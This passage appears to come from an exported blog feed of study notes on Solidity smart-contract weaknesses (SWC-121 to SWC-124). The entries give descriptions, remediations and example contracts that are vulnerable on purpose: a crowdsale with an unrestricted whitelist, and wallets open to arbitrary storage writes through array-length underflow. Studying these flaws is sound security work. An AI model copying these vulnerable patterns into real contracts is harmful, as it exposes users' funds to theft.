class="line"> * @title Standard ERC20 token</span><br><span class="line"> *</span><br><span class="line"> * @dev Implementation of the basic standard token.</span><br><span class="line"> * https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md</span><br><span class="line"> * Originally based on code by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol</span><br><span class="line"> *</span><br><span class="line"> * This implementation emits additional Approval events, allowing applications to reconstruct the allowance status for</span><br><span class="line"> * all accounts just by listening to said events. Note that this isn&#x27;t required by the specification, and other</span><br><span class="line"> * compliant implementations may not do it.</span><br><span class="line"> */</span><br><span class="line">contract ERC20 is IERC20 &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping (address =&gt; uint256) private _balances;</span><br><span class="line"></span><br><span class="line">    mapping (address =&gt; mapping (address =&gt; uint256)) private _allowed;</span><br><span class="line"></span><br><span class="line">    uint256 private _totalSupply;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * @dev Total number of tokens in existence</span><br><span class="line">    */</span><br><span class="line">    function totalSupply() public view returns (uint256) &#123;</span><br><span class="line">        return _totalSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * @dev Gets the balance of the specified address.</span><br><span class="line">    * @param owner The address to query the balance of.</span><br><span class="line">    * @return An uint256 representing the amount owned by the passed address.</span><br><span class="line">    */</span><br><span class="line">    function balanceOf(address owner) public view returns (uint256) &#123;</span><br><span class="line">        return _balances[owner];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Function to check the amount of tokens that an owner allowed to a spender.</span><br><span class="line">     * @param owner address The address which owns the funds.</span><br><span class="line">     * @param spender address The address which will spend the funds.</span><br><span class="line">     * @return A uint256 specifying the amount of tokens still available for the spender.</span><br><span class="line">     */</span><br><span class="line">    function allowance(address owner, address spender) public view returns (uint256) &#123;</span><br><span class="line">        return _allowed[owner][spender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * @dev Transfer token for a specified address</span><br><span class="line">    * @param to The address to transfer to.</span><br><span class="line">    * @param value The amount to be transferred.</span><br><span class="line">    */</span><br><span class="line">    function transfer(address to, uint256 value) public returns (bool) &#123;</span><br><span class="line">        _transfer(msg.sender, to, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.</span><br><span class="line">     * Beware that changing an allowance with this method brings the risk that someone may use both the old</span><br><span class="line">     * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this</span><br><span class="line">     * race condition is to first reduce the spender&#x27;s allowance to 0 and set the desired value afterwards:</span><br><span class="line">     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729</span><br><span class="line">     * @param spender The address which will spend the funds.</span><br><span class="line">     * @param value The amount of tokens to be spent.</span><br><span class="line">     */</span><br><span class="line">    function approve(address spender, uint256 value) public returns (bool) &#123;</span><br><span class="line">        require(spender != address(0));</span><br><span class="line"></span><br><span class="line">        _allowed[msg.sender][spender] = value;</span><br><span class="line">        emit Approval(msg.sender, spender, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Transfer tokens from one address to another.</span><br><span class="line">     * Note that while this function emits an Approval event, this is not required as per the specification,</span><br><span class="line">     * and other compliant implementations may not emit the event.</span><br><span class="line">     * @param from address The address which you want to send tokens from</span><br><span class="line">     * @param to address The address which you want to transfer to</span><br><span class="line">     * @param value uint256 the amount of tokens to be transferred</span><br><span class="line">     */</span><br><span class="line">    function transferFrom(address from, address to, uint256 value) public returns (bool) &#123;</span><br><span class="line">        _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);</span><br><span class="line">        _transfer(from, to, value);</span><br><span class="line">        emit Approval(from, msg.sender, _allowed[from][msg.sender]);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Increase the amount of tokens that an owner allowed to a spender.</span><br><span class="line">     * approve should be called when allowed_[_spender] == 0. To increment</span><br><span class="line">     * allowed value is better to use this function to avoid 2 calls (and wait until</span><br><span class="line">     * the first transaction is mined)</span><br><span class="line">     * From MonolithDAO Token.sol</span><br><span class="line">     * Emits an Approval event.</span><br><span class="line">     * @param spender The address which will spend the funds.</span><br><span class="line">     * @param addedValue The amount of tokens to increase the allowance by.</span><br><span class="line">     */</span><br><span class="line">    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) &#123;</span><br><span class="line">        require(spender != address(0));</span><br><span class="line"></span><br><span class="line">        _allowed[msg.sender][spender] = _allowed[msg.sender][spender].add(addedValue);</span><br><span class="line">        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Decrease the amount of tokens that an owner allowed to a spender.</span><br><span class="line">     * approve should be called when allowed_[_spender] == 0. To decrement</span><br><span class="line">     * allowed value is better to use this function to avoid 2 calls (and wait until</span><br><span class="line">     * the first transaction is mined)</span><br><span class="line">     * From MonolithDAO Token.sol</span><br><span class="line">     * Emits an Approval event.</span><br><span class="line">     * @param spender The address which will spend the funds.</span><br><span class="line">     * @param subtractedValue The amount of tokens to decrease the allowance by.</span><br><span class="line">     */</span><br><span class="line">    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) &#123;</span><br><span class="line">        require(spender != address(0));</span><br><span class="line"></span><br><span class="line">        _allowed[msg.sender][spender] = _allowed[msg.sender][spender].sub(subtractedValue);</span><br><span class="line">        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * @dev Transfer token for a specified addresses</span><br><span class="line">    * @param from The address to transfer from.</span><br><span class="line">    * @param to The address to transfer to.</span><br><span class="line">    * @param value The amount to be transferred.</span><br><span class="line">    */</span><br><span class="line">    function _transfer(address from, address to, uint256 value) internal &#123;</span><br><span class="line">        require(to != address(0));</span><br><span class="line"></span><br><span class="line">        _balances[from] = _balances[from].sub(value);</span><br><span class="line">        _balances[to] = _balances[to].add(value);</span><br><span class="line">        emit Transfer(from, to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Internal function that mints an amount of the token and assigns it to</span><br><span class="line">     * an account. This encapsulates the modification of balances such that the</span><br><span class="line">     * proper events are emitted.</span><br><span class="line">     * @param account The account that will receive the created tokens.</span><br><span class="line">     * @param value The amount that will be created.</span><br><span class="line">     */</span><br><span class="line">    function _mint(address account, uint256 value) internal &#123;</span><br><span class="line">        require(account != address(0));</span><br><span class="line"></span><br><span class="line">        _totalSupply = _totalSupply.add(value);</span><br><span class="line">        _balances[account] = _balances[account].add(value);</span><br><span class="line">        emit Transfer(address(0), account, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Internal function that burns an amount of the token of a given</span><br><span class="line">     * account.</span><br><span class="line">     * @param account The account whose tokens will be burnt.</span><br><span class="line">     * @param value The amount that will be burnt.</span><br><span class="line">     */</span><br><span class="line">    function _burn(address account, uint256 value) internal &#123;</span><br><span class="line">        require(account != address(0));</span><br><span class="line"></span><br><span class="line">        _totalSupply = _totalSupply.sub(value);</span><br><span class="line">        _balances[account] = _balances[account].sub(value);</span><br><span class="line">        emit Transfer(account, address(0), value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Internal function that burns an amount of the token of a given</span><br><span class="line">     * account, deducting from the sender&#x27;s allowance for said account. Uses the</span><br><span class="line">     * internal burn function.</span><br><span class="line">     * Emits an Approval event (reflecting the reduced allowance).</span><br><span class="line">     * @param account The account whose tokens will be burnt.</span><br><span class="line">     * @param value The amount that will be burnt.</span><br><span class="line">     */</span><br><span class="line">    function _burnFrom(address account, uint256 value) internal &#123;</span><br><span class="line">        _allowed[account][msg.sender] = _allowed[account][msg.sender].sub(value);</span><br><span class="line">        _burn(account, value);</span><br><span class="line">        emit Approval(account, msg.sender, _allowed[account][msg.sender]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title Roles</span><br><span class="line"> * @dev Library for managing addresses assigned to a Role.</span><br><span class="line"> */</span><br><span class="line">library Roles &#123;</span><br><span class="line">    struct Role &#123;</span><br><span class="line">        mapping (address =&gt; bool) bearer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev give an account access to this role</span><br><span class="line">     */</span><br><span class="line">    function add(Role storage role, address account) internal &#123;</span><br><span class="line">        require(account != address(0));</span><br><span class="line">        require(!has(role, account));</span><br><span class="line"></span><br><span class="line">        role.bearer[account] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev remove an account&#x27;s access to this role</span><br><span class="line">     */</span><br><span class="line">    function remove(Role storage role, address account) internal &#123;</span><br><span class="line">        require(account != address(0));</span><br><span class="line">        require(has(role, account));</span><br><span class="line"></span><br><span class="line">        role.bearer[account] = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev check if an account has this role</span><br><span class="line">     * @return bool</span><br><span class="line">     */</span><br><span class="line">    function has(Role storage role, address account) internal view returns (bool) &#123;</span><br><span class="line">        require(account != address(0));</span><br><span class="line">        return role.bearer[account];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MinterRole &#123;</span><br><span class="line">    using Roles for Roles.Role;</span><br><span class="line"></span><br><span class="line">    event MinterAdded(address indexed account);</span><br><span class="line">    event MinterRemoved(address indexed account);</span><br><span class="line"></span><br><span class="line">    Roles.Role private _minters;</span><br><span class="line"></span><br><span class="line">    constructor () internal &#123;</span><br><span class="line">        _addMinter(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyMinter() &#123;</span><br><span class="line">        require(isMinter(msg.sender));</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isMinter(address account) public view returns (bool) &#123;</span><br><span class="line">        return _minters.has(account);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addMinter(address account) public onlyMinter &#123;</span><br><span class="line">        _addMinter(account);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function renounceMinter() public &#123;</span><br><span class="line">        _removeMinter(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _addMinter(address account) internal &#123;</span><br><span class="line">        _minters.add(account);</span><br><span class="line">        emit MinterAdded(account);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _removeMinter(address account) internal &#123;</span><br><span class="line">        _minters.remove(account);</span><br><span class="line">        emit MinterRemoved(account);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title ERC20Mintable</span><br><span class="line"> * @dev ERC20 minting logic</span><br><span class="line"> */</span><br><span class="line">contract ERC20Mintable is ERC20, MinterRole &#123;</span><br><span class="line">    /**</span><br><span class="line">     * @dev Function to mint tokens</span><br><span class="line">     * @param to The address that will receive the minted tokens.</span><br><span class="line">     * @param value The amount of tokens to mint.</span><br><span class="line">     * @return A boolean that indicates if the operation was successful.</span><br><span class="line">     */</span><br><span class="line">    function mint(address to, uint256 value) public onlyMinter returns (bool) &#123;</span><br><span class="line">        _mint(to, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">/**</span><br><span class="line"> * @title Crowdsale</span><br><span class="line"> * @dev Crowdsale is a base contract for managing a token crowdsale.</span><br><span class="line"> * Crowdsales have a start and end block, where investors can make</span><br><span class="line"> * token purchases and the crowdsale will assign them tokens based</span><br><span class="line"> * on a token per ETH rate. Funds collected are forwarded to a wallet</span><br><span class="line"> * as they arrive.</span><br><span class="line"> */</span><br><span class="line">contract Crowdsale &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    // The token being sold</span><br><span class="line">    ERC20Mintable public token;</span><br><span class="line"></span><br><span class="line">    // start and end block where investments are allowed (both inclusive)</span><br><span class="line">    uint256 public startBlock;</span><br><span class="line">    uint256 public endBlock;</span><br><span class="line"></span><br><span class="line">    // address where funds are collected</span><br><span class="line">    address public wallet;</span><br><span class="line"></span><br><span class="line">    // how many token units a buyer gets per wei</span><br><span class="line">    uint256 public rate;</span><br><span class="line"></span><br><span class="line">    // amount of raised money in wei</span><br><span class="line">    uint256 public weiRaised;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * event for token purchase logging</span><br><span class="line">    * @param purchaser who paid for the tokens</span><br><span class="line">    * @param beneficiary who got the tokens</span><br><span class="line">    * @param value weis paid for purchase</span><br><span class="line">    * @param amount amount of tokens purchased</span><br><span class="line">    */</span><br><span class="line">    event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);</span><br><span class="line"></span><br><span class="line">    function Crowdsale(uint256 _startBlock, uint256 _endBlock, uint256 _rate, address _wallet) &#123;</span><br><span class="line">        require(_startBlock &gt;= block.number);</span><br><span class="line">        require(_endBlock &gt;= _startBlock);</span><br><span class="line">        require(_rate &gt; 0);</span><br><span class="line">        require(_wallet != 0x0);</span><br><span class="line"></span><br><span class="line">        token = createTokenContract();</span><br><span class="line">        startBlock = _startBlock;</span><br><span class="line">        endBlock = _endBlock;</span><br><span class="line">        rate = _rate;</span><br><span class="line">        wallet = _wallet;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // creates the token to be sold.</span><br><span class="line">    // override this method to have crowdsale of a specific mintable token.</span><br><span class="line">    function createTokenContract() internal returns (ERC20Mintable) &#123;</span><br><span class="line">        return new ERC20Mintable();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // fallback function can be used to buy tokens</span><br><span class="line">    function () payable &#123;</span><br><span class="line">        buyTokens(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // low level token purchase function</span><br><span class="line">    function buyTokens(address beneficiary) payable &#123;</span><br><span class="line">        require(beneficiary != 0x0);</span><br><span class="line">        require(validPurchase());</span><br><span class="line"></span><br><span class="line">        uint256 weiAmount = msg.value;</span><br><span class="line"></span><br><span class="line">        // calculate token amount to be created</span><br><span class="line">        uint256 tokens = weiAmount.mul(rate);</span><br><span class="line"></span><br><span class="line">        // update state</span><br><span class="line">        weiRaised = weiRaised.add(weiAmount);</span><br><span class="line"></span><br><span class="line">        token.mint(beneficiary, tokens);</span><br><span class="line">        TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);</span><br><span class="line"></span><br><span class="line">        forwardFunds();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // send ether to the fund collection wallet</span><br><span class="line">    // override to create custom fund forwarding mechanisms</span><br><span class="line">    function forwardFunds() internal &#123;</span><br><span class="line">        wallet.transfer(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // @return true if the transaction can buy tokens</span><br><span class="line">    function validPurchase() internal constant returns (bool) &#123;</span><br><span class="line">        uint256 current = block.number;</span><br><span class="line">        bool withinPeriod = current &gt;= startBlock &amp;&amp; current &lt;= endBlock;</span><br><span class="line">        bool nonZeroPurchase = msg.value != 0;</span><br><span class="line">        return withinPeriod &amp;&amp; nonZeroPurchase;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // @return true if crowdsale event has ended</span><br><span class="line">    function hasEnded() public constant returns (bool) &#123;</span><br><span class="line">        return block.number &gt; endBlock;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title CappedCrowdsale</span><br><span class="line"> * @dev Extension of Crowsdale with a max amount of funds raised</span><br><span class="line"> */</span><br><span class="line"> contract CappedCrowdsale is Crowdsale &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line">    uint256 public cap;</span><br><span class="line"></span><br><span class="line">    function CappedCrowdsale(uint256 _cap) &#123;</span><br><span class="line">        require(_cap &gt; 0);</span><br><span class="line">        cap = _cap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // overriding Crowdsale#validPurchase to add extra cap logic</span><br><span class="line">    // @return true if investors can buy at the moment</span><br><span class="line">    function validPurchase() internal constant returns (bool) &#123;</span><br><span class="line">        bool withinCap = weiRaised.add(msg.value) &lt;= cap;</span><br><span class="line">        return super.validPurchase() &amp;&amp; withinCap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // overriding Crowdsale#hasEnded to add cap logic</span><br><span class="line">    // @return true if crowdsale event has ended</span><br><span class="line">    function hasEnded() public constant returns (bool) &#123;</span><br><span class="line">        bool capReached = weiRaised &gt;= cap;</span><br><span class="line">        return super.hasEnded() || capReached;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title WhitelistedCrowdsale</span><br><span class="line"> * @dev Extension of Crowsdale with a whitelist of investors that</span><br><span class="line"> * can buy before the start block</span><br><span class="line"> */</span><br><span class="line">contract WhitelistedCrowdsale is Crowdsale &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping (address =&gt; bool) public whitelist;</span><br><span class="line"></span><br><span class="line">    function addToWhitelist(address addr) &#123;</span><br><span class="line">        require(msg.sender != address(this));</span><br><span class="line">        whitelist[addr] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // overriding Crowdsale#validPurchase to add extra whitelit logic</span><br><span class="line">    // @return true if investors can buy at the moment</span><br><span class="line">    function validPurchase() internal constant returns (bool) &#123;</span><br><span class="line">        return super.validPurchase() || (whitelist[msg.sender] &amp;&amp; !hasEnded());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MDTCrowdsale is CappedCrowdsale, WhitelistedCrowdsale &#123;</span><br><span class="line"></span><br><span class="line">    function MDTCrowdsale()</span><br><span class="line">    CappedCrowdsale(50000000000000000000000)</span><br><span class="line">    Crowdsale(block.number, block.number + 100000, 1, msg.sender) &#123; // Wallet is the contract creator, to whom funds will be sent</span><br><span class="line">        addToWhitelist(msg.sender);</span><br><span class="line">        addToWhitelist(0x0d5bda9db5dd36278c6a40683960ba58cac0149b);</span><br><span class="line">        addToWhitelist(0x1b6ddc637c24305b354d7c337f9126f68aad4886);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>24.SWC-124_storage</title>
      <link href="/2023/07/13/09.SWC/24.SWC-124_storage/"/>
      <url>/2023/07/13/09.SWC/24.SWC-124_storage/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-124-storage"><a href="#SWC-124-storage" class="headerlink" title="SWC-124_storage"></a>SWC-124_storage</h1><p>Write to Arbitrary Storage Location</p><ul><li><strong>Description</strong>: A smart contract’s data (e.g., storing the owner of the contract) is persistently stored at some storage location (i.e., a key or address) on the EVM level. The contract is responsible for ensuring that only authorized user or contract accounts may write to sensitive storage locations. If an attacker is able to write to arbitrary storage locations of a contract, the authorization checks may easily be circumvented. This can allow an attacker to corrupt the storage; for instance, by overwriting a field that stores the address of the contract owner.</li><li><strong>Remediation</strong>: As a general advice, given that all data structures share the same storage (address) space, one should make sure that writes to one data structure cannot inadvertently overwrite entries of another data structure.</li></ul><p>vulnerability contract 1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.25;</span><br><span class="line"></span><br><span class="line">contract Wallet &#123;</span><br><span class="line">    uint[] private bonusCodes;</span><br><span class="line">    address private owner;</span><br><span class="line"></span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        bonusCodes = new uint[](0);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () public payable &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function PushBonusCode(uint c) public &#123;</span><br><span class="line">        bonusCodes.push(c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function PopBonusCode() public &#123;</span><br><span class="line">        require(0 &lt;= bonusCodes.length);</span><br><span class="line">        // fix : require(0 &lt; bonusCodes.length);</span><br><span class="line">        bonusCodes.length--;</span><br><span class="line">    &#125; // underflow to get all storage layout</span><br><span class="line"></span><br><span class="line">    function UpdateBonusCodeAt(uint idx, uint c) public &#123;</span><br><span class="line">        require(idx &lt; bonusCodes.length);</span><br><span class="line">        bonusCodes[idx] = c;</span><br><span class="line">    &#125; // set the storage layout</span><br><span class="line"></span><br><span class="line">    function Destroy() public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        selfdestruct(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vulnerability contract 2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">//This code is derived from the Capture the Ether https://capturetheether.com/challenges/math/mapping/</span><br><span class="line"></span><br><span class="line">contract Map &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256[] map;</span><br><span class="line"></span><br><span class="line">    function set(uint256 key, uint256 value) public &#123;</span><br><span class="line">        if (map.length &lt;= key) &#123;</span><br><span class="line">        // https://www.levi104.com/2023/06/23/01.Capturetheether%20CTF/10.Mapping/</span><br><span class="line">            map.length = key + 1;</span><br><span class="line">        &#125;</span><br><span class="line">        map[key] = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get(uint256 key) public view returns (uint256) &#123;</span><br><span class="line">        return map[key];</span><br><span class="line">    &#125;</span><br><span class="line">    function withdraw() public&#123;</span><br><span class="line">      require(msg.sender == owner);</span><br><span class="line">      msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>23.SWC-123_Requirement Violation</title>
      <link href="/2023/07/13/09.SWC/23.SWC-123_Requirement%20Violation/"/>
      <url>/2023/07/13/09.SWC/23.SWC-123_Requirement%20Violation/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-123-Requirement-Violation"><a href="#SWC-123-Requirement-Violation" class="headerlink" title="SWC-123_Requirement Violation"></a>SWC-123_Requirement Violation</h1><p>Requirement Violation</p><ul><li><p><strong>Description</strong>: The Solidity <code>require()</code> construct is meant to validate external inputs of a function. In most cases, such external inputs are provided by callers, but they may also be returned by callees. In the former case, we refer to them as precondition violations. Violations of a requirement can indicate one of two possible issues:</p><ol><li>A bug exists in the contract that provided the external input.</li><li>The condition used to express the requirement is too strong.</li></ol></li><li><p><strong>Remediation</strong>: If the required logical condition is too strong, it should be weakened to allow all valid external inputs.</p><p>Otherwise, the bug must be in the contract that provided the external input and one should consider fixing its code by making sure no invalid inputs are provided.</p></li></ul><p>vulnerability contract 1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.25;</span><br><span class="line"></span><br><span class="line">contract Bar &#123;</span><br><span class="line">    Foo private f = new Foo();</span><br><span class="line">    function doubleBaz() public view returns (int256) &#123;</span><br><span class="line">        return 2 * f.baz(0);</span><br><span class="line">        // fix: return 2 * f.baz(1); //Changes the external contract to not hit the overly strong requirement.</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Foo &#123;</span><br><span class="line">    function baz(int256 x) public pure returns (int256) &#123;</span><br><span class="line">        require(0 &lt; x);</span><br><span class="line">        return 42;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>22.SWC-122_Lack of Proper Signature Verification</title>
      <link href="/2023/07/13/09.SWC/22.SWC-122_Lack%20of%20Proper%20Signature%20Verification/"/>
      <url>/2023/07/13/09.SWC/22.SWC-122_Lack%20of%20Proper%20Signature%20Verification/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-122-Lack-of-Proper-Signature-Verification"><a href="#SWC-122-Lack-of-Proper-Signature-Verification" class="headerlink" title="SWC-122_Lack of Proper Signature Verification"></a>SWC-122_Lack of Proper Signature Verification</h1><p>Lack of Proper Signature Verification</p><ul><li><strong>Description</strong>: It is a common pattern for smart contract systems to allow users to sign messages off-chain instead of directly requesting users to do an on-chain transaction because of the flexibility and increased transferability that this provides. Smart contract systems that process signed messages have to implement their own logic to recover the authenticity from the signed messages before they process them further. A limitation for such systems is that smart contracts can not directly interact with them because they can not sign messages. Some signature verification implementations attempt to solve this problem by assuming the validity of a signed message based on other methods that do not have this limitation. An example of such a method is to rely on <code>msg.sender</code> and assume that if a signed message originated from the sender address then it has also been created by the sender address. This can lead to vulnerabilities especially in scenarios where proxies can be used to relay transactions.</li><li><strong>Remediation</strong>: It is not recommended to use alternate verification schemes that do not require proper signature verification through <code>ecrecover()</code>.</li></ul>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>21.SWC-121_Signature Replay Attacks</title>
      <link href="/2023/07/13/09.SWC/21.SWC-121_Signature%20Replay%20Attacks/"/>
      <url>/2023/07/13/09.SWC/21.SWC-121_Signature%20Replay%20Attacks/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-121-Signature-Replay-Attacks"><a href="#SWC-121-Signature-Replay-Attacks" class="headerlink" title="SWC-121_Signature Replay Attacks"></a>SWC-121_Signature Replay Attacks</h1><p>Missing Protection against Signature Replay Attacks</p><ul><li><strong>Description</strong>: It is sometimes necessary to perform signature verification in smart contracts to achieve better usability or to save gas cost. A secure implementation needs to protect against Signature Replay Attacks by for example keeping track of all processed message hashes and only allowing new message hashes to be processed. A malicious user could attack a contract without such a control and get message hash that was sent by another user processed multiple times.</li><li><strong>Remediation</strong>: In order to protect against signature replay attacks consider the following recommendations:<ul><li>Store every message hash that has been processed by the smart contract. When new messages are received check against the already existing ones and only proceed with the business logic if it’s a new message hash.</li><li>Include the address of the contract that processes the message. This ensures that the message can only be used in a single contract.</li><li>Under no circumstances generate the message hash including the signature. The <code>ecrecover</code> function is susceptible to signature malleability (see also SWC-117).</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>20.SWC-120_Pseudo Random Number</title>
      <link href="/2023/07/13/09.SWC/20.SWC-120_Pseudo%20Random%20Number/"/>
      <url>/2023/07/13/09.SWC/20.SWC-120_Pseudo%20Random%20Number/</url>
      
